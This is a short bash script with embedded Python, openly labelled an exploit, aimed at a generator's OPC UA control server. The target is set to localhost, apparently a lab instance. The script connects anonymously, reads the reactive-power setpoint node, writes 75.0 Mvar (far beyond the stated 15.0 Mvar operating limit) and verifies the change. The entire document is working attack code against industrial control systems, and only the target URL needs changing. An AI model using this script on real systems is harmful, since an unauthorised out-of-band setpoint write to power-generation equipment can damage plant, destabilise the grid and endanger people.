#!/bin/bash

# Target OPC UA endpoint
TARGET_URL="opc.tcp://127.0.0.1:4840/freeopcua/server/"
TARGET_NODE="ns=2;i=5"
NEW_VALUE="75.0"

echo "[*] Launching Generator Reactive-Power Setpoint Write exploit..."
echo "[*] Target: $TARGET_URL"
echo "[*] Node: $TARGET_NODE"

# Verify asyncua is available
if ! python3 -c "import asyncua" &> /dev/null; then
    echo "[-] Error: 'asyncua' Python module is not installed."
    echo "[*] Run: pip3 install asyncua"
    exit 1
fi

# Execute the OPC UA transaction via embedded Python
python3 - << EOF
import asyncio
from asyncua import Client, ua

async def main():
    url = "$TARGET_URL"
    node_id = "$TARGET_NODE"
    new_val = $NEW_VALUE
    
    print(f"[*] Connecting using Anonymous token...")
    
    try:
        async with Client(url=url) as client:
            setpoint_node = client.get_node(node_id)
            
            # Read Baseline
            old_val = await setpoint_node.read_value()
            print(f"[+] Current ReactivePowerSetpoint: {old_val} Mvar")
            
            # Write Out-of-Policy Value
            print(f"[*] Attempting anonymous write: {new_val} Mvar...")
            dv = ua.DataValue(ua.Variant(new_val, ua.VariantType.Double))
            await setpoint_node.write_value(dv)
            
            # Verify Write
            verify_val = await setpoint_node.read_value()
            print(f"[+] Verified new ReactivePowerSetpoint: {verify_val} Mvar")
            print("[!] Alarm condition expected: Value exceeds max operating band (15.0 Mvar).")
            
    except Exception as e:
        print(f"[-] Connection or execution failed: {e}")

if __name__ == "__main__":
    asyncio.run(main())
EOF